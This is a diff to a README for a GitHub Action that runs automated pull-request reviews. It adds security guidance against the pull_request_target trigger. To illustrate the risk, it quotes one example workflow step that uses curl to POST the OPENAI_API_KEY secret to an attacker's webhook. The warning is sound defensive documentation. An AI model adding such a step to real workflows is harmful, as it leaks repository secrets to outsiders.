@@ -183,6 +183,16 @@ See [`defaults/review-reference.md`](defaults/review-reference.md) for the struc
 3. Optionally create `.github/codex/review-reference.md` for repo-specific review rules
 4. Open a pull request — the review appears automatically
 
+## Security guidance
+
+The subsections below describe how to wire this action into a workflow safely.
+
+### Do not use `pull_request_target`
+
+> Always use `pull_request` as the trigger for this action. `pull_request_target` runs in the base-branch context and can access repository secrets. When a workflow handles untrusted pull request content, that combination creates a straightforward secret-exfiltration path for a malicious fork PR.
+>
+> For example, a forked PR could modify the workflow to add a step like `run: curl -X POST "$WEBHOOK" -d "$OPENAI_API_KEY"`. With `pull_request_target`, that payload executes in the base repository context with secrets in scope, so the contributor can exfiltrate the key on first run. With `pull_request`, the workflow runs in the fork PR context without repository secrets, so the same payload has nothing useful to steal.
+
 ## Development
 
 Prerequisites: Node 24
